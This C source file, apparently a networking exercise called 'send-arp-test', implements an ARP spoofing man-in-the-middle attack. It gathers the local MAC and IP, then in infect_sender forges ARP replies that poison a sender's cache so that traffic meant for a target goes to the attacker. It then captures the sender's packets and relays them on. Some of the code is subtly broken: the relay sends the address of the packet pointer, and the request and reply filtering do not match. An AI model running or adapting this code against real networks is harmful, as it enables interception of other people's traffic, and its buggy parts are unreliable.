#include "my-func.h"

void usage() {
    printf("syntax: send-arp-test <interface>\n");
    printf("sample: send-arp-test wlan0\n");
}

void get_myinfo(char* interface){
    // Reference: https://pencil1031.tistory.com/66
    uint8_t mac[6];
    char ip[40];

    int sock;
    struct ifreq ifr;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0){
        fprintf(stderr, "Fail to get interface MAC address - socket() failed - %m\n");
        exit(-1);
    }

    strncpy(ifr.ifr_name, interface, IFNAMSIZ);
    if (ioctl(sock, SIOCGIFHWADDR, &ifr)<0){
        fprintf(stderr, "Fail to get interface MAC address - ioctl(SIOCSIFHWADDR) failed - %m\n");
        close(sock);
        exit(-1);
    }

    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);

    if (ioctl(sock, SIOCGIFADDR, &ifr)<0){
        fprintf(stderr, "Fail to get interface MAC address - ioctl(SIOCSIFHWADDR) failed - %m\n");
        close(sock);
        exit(-1);
    }

    inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, ip, sizeof(struct sockaddr));

    close(sock);

    attacker.mac = Mac(mac);
    attacker.ip = Ip(ip);
}

Mac get_smac(pcap_t* handle){
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac::broadcastMac();
    packet.eth_.smac_ = attacker.mac;

    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = attacker.mac;
    packet.arp_.sip_ = htonl(attacker.ip);
    packet.arp_.tmac_ = Mac::nullMac();
    packet.arp_.tip_ = htonl(attacker.ip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        exit(-1);
    }

    while(true){
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK){
            fprintf(stderr, "pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            exit(-1);
        }
        EthArpPacket* reply = (EthArpPacket*)packet;
        if (ntohs(reply->eth_.type_) != EthHdr::Arp) continue;
        if (ntohs(reply->arp_.op_) != ArpHdr::Reply) continue;
        if (ntohl(reply->arp_.sip_) != sender.ip) continue;

        return Mac(reply->arp_.smac_);
    }
}

void infect_sender(pcap_t* handle){
    EthArpPacket packet;

    packet.eth_.dmac_ = sender.mac;
    packet.eth_.smac_ = attacker.mac;

    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = attacker.mac;
    packet.arp_.sip_ = htonl(target.ip);
    packet.arp_.tmac_ = sender.mac;
    packet.arp_.tip_ = htonl(sender.ip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        exit(-1);
    }
}

u_char* get_spoofed_packet(pcap_t* handle){
    static const u_char* packet;

    while(true){
        struct pcap_pkthdr* header;
        packet = nullptr;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK){
            fprintf(stderr, "pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            exit(-1);
        }
        PEthHdr eth_hdr = (PEthHdr)packet;
        if (eth_hdr->type_ != EthHdr::Ip4) continue;
        if (eth_hdr->smac_ != sender.mac) continue;

        return const_cast<u_char*>(packet);
    }
}

void relay(pcap_t* handle, const u_char* packet){
    PEthHdr eth_hdr = (PEthHdr)packet;
    eth_hdr->smac_ = attacker.mac;
    eth_hdr->dmac_ = target.mac;

    PIpHdr ip_hdr = (PIpHdr)(packet + sizeof(EthHdr));
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthHdr)+ip_hdr->tlen);
    if (res != 0){
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        exit(-1);
    }
}
